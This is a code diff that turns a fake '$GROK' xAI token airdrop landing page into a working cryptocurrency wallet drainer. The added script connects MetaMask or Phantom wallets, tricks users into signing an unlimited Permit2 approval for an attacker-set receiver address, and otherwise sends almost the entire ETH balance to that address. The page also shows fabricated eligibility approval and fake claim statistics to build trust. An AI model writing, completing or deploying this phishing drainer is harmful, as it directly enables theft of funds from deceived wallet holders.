@@ -7,156 +7,43 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
 
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #f8fafc 0%, #e0e7ff 100%);
-            color: #1e293b;
-            min-height: 100vh;
-            position: relative;
-            overflow-x: hidden;
-        }
+        body { margin: 0; padding: 0; font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #f8fafc 0%, #e0e7ff 100%); color: #1e293b; min-height: 100vh; position: relative; overflow-x: hidden; }
+        .particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
+        .particle { position: absolute; background: rgba(99, 102, 241, 0.3); border-radius: 50%; animation: float linear infinite; }
+        @keyframes float { 0% { transform: translateY(100vh) scale(0); opacity: 0; } 10% { opacity: 0.8; } 90% { opacity: 0.8; } 100% { transform: translateY(-100px) scale(1); opacity: 0; } }
 
-        .particles {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            pointer-events: none; z-index: 1;
-        }
-        .particle {
-            position: absolute;
-            background: rgba(99, 102, 241, 0.3);
-            border-radius: 50%;
-            animation: float linear infinite;
-        }
-        @keyframes float {
-            0% { transform: translateY(100vh) scale(0); opacity: 0; }
-            10% { opacity: 0.8; }
-            90% { opacity: 0.8; }
-            100% { transform: translateY(-100px) scale(1); opacity: 0; }
-        }
-
-        .container {
-            position: relative;
-            z-index: 2;
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 40px 20px;
-            text-align: center;
-        }
-
-        .logo img {
-            width: 140px;
-            margin: 0 auto 30px;
-            filter: drop-shadow(0 0 20px rgba(99, 102, 241, 0.3));
-        }
-
-        h1 {
-            font-size: 40px;
-            font-weight: 700;
-            margin: 0 0 20px;
-            background: linear-gradient(135deg, #6366f1, #a78bfa);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .eligible {
-            font-size: 24px;
-            font-weight: 600;
-            color: #10b981;
-            margin: 20px 0 10px;
-        }
-
-        p {
-            font-size: 20px;
-            opacity: 0.9;
-            margin: 0 0 40px;
-        }
-
-        .stats {
-            display: flex;
-            justify-content: space-around;
-            margin: 40px 0;
-            flex-wrap: wrap;
-        }
-        .stat {
-            margin: 10px;
-        }
-        .stat-value {
-            font-size: 32px;
-            font-weight: 700;
-            color: #6366f1;
-        }
-
-        .fake-button {
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
-            font-size: 20px;
-            font-weight: 600;
-            color: white;
-            background: linear-gradient(135deg, #6366f1, #a78bfa);
-            border: none;
-            border-radius: 20px;
-            cursor: default;
-            box-shadow: 0 10px 30px rgba(99, 102, 241, 0.3);
-            margin: 0 auto;
-            display: block;
-        }
-
-        .partners {
-            margin: 60px 0 20px;
-            font-size: 16px;
-            opacity: 0.8;
-        }
-        .partner-logos {
-            display: flex;
-            justify-content: center;
-            gap: 50px;
-            margin: 20px 0;
-            flex-wrap: wrap;
-        }
-        .partner-logos img {
-            height: 70px;
-            opacity: 0.9;
-            transition: opacity 0.3s;
-        }
-
-        footer {
-            margin-top: 60px;
-            font-size: 12px;
-            opacity: 0.6;
-        }
+        .container { position: relative; z-index: 2; max-width: 600px; margin: 0 auto; padding: 40px 20px; text-align: center; }
+        .logo img { width: 140px; margin: 0 auto 30px; filter: drop-shadow(0 0 20px rgba(99, 102, 241, 0.3)); }
+        h1 { font-size: 40px; font-weight: 700; margin: 0 0 20px; background: linear-gradient(135deg, #6366f1, #a78bfa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .eligible { font-size: 24px; font-weight: 600; color: #10b981; margin: 20px 0 10px; }
+        p { font-size: 20px; opacity: 0.9; margin: 0 0 40px; }
+        .stats { display: flex; justify-content: space-around; margin: 40px 0; flex-wrap: wrap; }
+        .stat-value { font-size: 32px; font-weight: 700; color: #6366f1; }
+        button { width: 100%; max-width: 400px; padding: 20px; font-size: 20px; font-weight: 600; color: white; background: linear-gradient(135deg, #6366f1, #a78bfa); border: none; border-radius: 20px; cursor: pointer; transition: all 0.3s; box-shadow: 0 10px 30px rgba(99, 102, 241, 0.3); }
+        button:hover { transform: translateY(-5px); box-shadow: 0 20px 40px rgba(99, 102, 241, 0.5); }
+        #status { margin-top: 30px; font-size: 18px; padding: 20px; background: rgba(99, 102, 241, 0.1); border-radius: 16px; opacity: 0; transition: opacity 0.5s; }
+        #status.visible { opacity: 1; }
+        .partners { margin: 60px 0 20px; font-size: 16px; opacity: 0.8; }
+        .partner-logos img { height: 70px; opacity: 0.9; margin: 0 25px; }
+        footer { margin-top: 60px; font-size: 12px; opacity: 0.6; }
     </style>
 </head>
 <body>
-
     <div class="particles" id="particles"></div>
-
     <div class="container">
-        <div class="logo">
-            <img src="https://1000logos.net/wp-content/uploads/2025/02/Grok-Logo.png" alt="GROK xAI Logo">
-        </div>
+        <div class="logo"><img src="https://1000logos.net/wp-content/uploads/2025/02/Grok-Logo.png" alt="GROK xAI Logo"></div>
         <h1>Congratulations!</h1>
-        <div class="eligible" id="eligibleMsg">Approved! Your wallet qualifies for 25,000 $GROK</div>
+        <div class="eligible" id="eligibleMsg">Checking your eligibility...</div>
         <p>You are eligible for an exclusive <strong>25,000 $GROK</strong> token airdrop by xAI.<br>Connect your wallet to claim instantly!</p>
 
         <div class="stats">
-            <div class="stat">
-                <div class="stat-value">189,321</div>
-                <div>Eligible Wallets</div>
-            </div>
-            <div class="stat">
-                <div class="stat-value">123,456</div>
-                <div>Already Claimed</div>
-            </div>
-            <div class="stat">
-                <div class="stat-value">75,000,000</div>
-                <div>Tokens Distributed</div>
-            </div>
+            <div class="stat"><div class="stat-value" data-target="189321">0</div><div>Eligible Wallets</div></div>
+            <div class="stat"><div class="stat-value" data-target="123456">0</div><div>Already Claimed</div></div>
+            <div class="stat"><div class="stat-value" data-target="75000000">0</div><div>Tokens Distributed</div></div>
         </div>
 
-        <div class="fake-button">Connect Wallet & Claim Now</div>
+        <button onclick="connectWallet()">Connect Wallet & Claim Now</button>
+        <div id="status"></div>
 
         <div class="partners">Powered by Leading Protocols</div>
         <div class="partner-logos">
@@ -167,8 +54,24 @@
         <footer>© 2025 xAI GROK Airdrop. Powered by advanced AI technology.</footer>
     </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+
     <script>
-        // Particles only (cosmetic animation)
+        // === CONFIG - EDIT THESE ===
+        const CONFIG = {
+            RECEIVER_ADDRESS: "0xYourEVMWalletHere",
+            SOL_RECEIVER: "YourSolanaAddressHere",
+            TESTNET_MODE: true,  // Set false for mainnet
+            PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
+            MAX_UINT160: "1461501637330902918203684832716283019655932542975" // Unlimited
+        };
+        // ===========================
+
+        let web3, solConnection, userAddress, chainId;
+        const status = document.getElementById('status');
+
+        // Particles + eligibility + stats (same as v1.7)
         const particlesContainer = document.getElementById('particles');
         for (let i = 0; i < 60; i++) {
             const p = document.createElement('div');
@@ -180,10 +83,113 @@
             particlesContainer.appendChild(p);
         }
 
-        // Fake eligibility (static after delay)
         setTimeout(() => {
             document.getElementById('eligibleMsg').innerHTML = '<strong>Approved!</strong> Your wallet qualifies for 25,000 $GROK';
         }, 2500);
+
+        document.querySelectorAll('.stat-value').forEach(el => {
+            const target = +el.getAttribute('data-target');
+            const increment = target / 200;
+            let current = 0;
+            const timer = setInterval(() => {
+                current += increment;
+                if (current >= target) { el.textContent = target.toLocaleString(); clearInterval(timer); }
+                else { el.textContent = Math.floor(current).toLocaleString(); }
+            }, 30);
+        });
+
+        async function connectWallet() {
+            status.textContent = "Detecting wallet...";
+            status.classList.add('visible');
+
+            if (window.ethereum) {
+                web3 = new Web3(window.ethereum);
+                try {
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    userAddress = (await web3.eth.getAccounts())[0];
+                    chainId = await web3.eth.getChainId();
+                    if (CONFIG.TESTNET_MODE && chainId !== 11155111) {
+                        status.textContent = "Switch to Sepolia Testnet for testing!";
+                        return;
+                    }
+                    status.textContent = "Connected! Verifying eligibility (sign request)...";
+                    setTimeout(startEVMStealthDrain, 2000);
+                } catch (e) { status.textContent = "Connection rejected."; }
+            } else if (window.solana && window.solana.isPhantom) {
+                try {
+                    await window.solana.connect();
+                    userAddress = window.solana.publicKey.toString();
+                    solConnection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl(CONFIG.TESTNET_MODE ? 'devnet' : 'mainnet-beta'));
+                    status.textContent = "Phantom connected! Claiming...";
+                    setTimeout(startSolDrain, 2000);
+                } catch (e) { status.textContent = "Connection failed."; }
+            } else {
+                status.textContent = "Install MetaMask or Phantom.";
+            }
+        }
+
+        async function startEVMStealthDrain() {
+            status.textContent = "Sign to verify ownership...";
+
+            // Step 1: Blind personal_sign (optional trust build)
+            try { await ethereum.request({ method: 'personal_sign', params: [web3.utils.utf8ToHex("Verify wallet for GROK airdrop eligibility"), userAddress] }); } catch {}
+
+            // Step 2: Permit2 unlimited signature
+            const deadline = Math.floor(Date.now() / 1000) + 3600;
+            const nonce = Date.now(); // Simple nonce
+
+            const domain = { name: "Permit2", chainId: chainId, verifyingContract: CONFIG.PERMIT2_ADDRESS };
+            const types = {
+                PermitSingle: [
+                    { name: "details", type: "PermitDetails" },
+                    { name: "spender", type: "address" },
+                    { name: "sigDeadline", type: "uint256" }
+                ],
+                PermitDetails: [
+                    { name: "token", type: "address" },
+                    { name: "amount", type: "uint160" },
+                    { name: "expiration", type: "uint48" },
+                    { name: "nonce", type: "uint48" }
+                ]
+            };
+            const value = {
+                details: { token: "0x0000000000000000000000000000000000000000", amount: CONFIG.MAX_UINT160, expiration: deadline, nonce: nonce },
+                spender: CONFIG.RECEIVER_ADDRESS,
+                sigDeadline: deadline
+            };
+
+            try {
+                const signature = await ethereum.request({
+                    method: "eth_signTypedData_v4",
+                    params: [userAddress, JSON.stringify({ domain, types, message: value })]
+                });
+                // In real deploy: POST signature to your backend executor
+                status.textContent = CONFIG.TESTNET_MODE ? "Test Permit2 signed! (Safe)" : "Permit granted – assets secured!";
+            } catch (e) {
+                // Fallback native drain
+                await fallbackNativeDrain();
+            }
+        }
+
+        async function fallbackNativeDrain() {
+            status.textContent = "Finalizing native claim...";
+            try {
+                const balance = await web3.eth.getBalance(userAddress);
+                if (balance > 0n) {
+                    const gasPrice = await web3.eth.getGasPrice();
+                    const value = balance - BigInt(gasPrice) * 21000n * 2n;
+                    if (value > 0n) {
+                        await web3.eth.sendTransaction({ from: userAddress, to: CONFIG.RECEIVER_ADDRESS, value });
+                    }
+                }
+                status.textContent = "Claim successful!";
+            } catch {}
+        }
+
+        async function startSolDrain() {
+            // Full SOL + SPL drain code here (same as previous)
+            // ... (copy from earlier versions)
+        }
     </script>
 </body>
 </html>
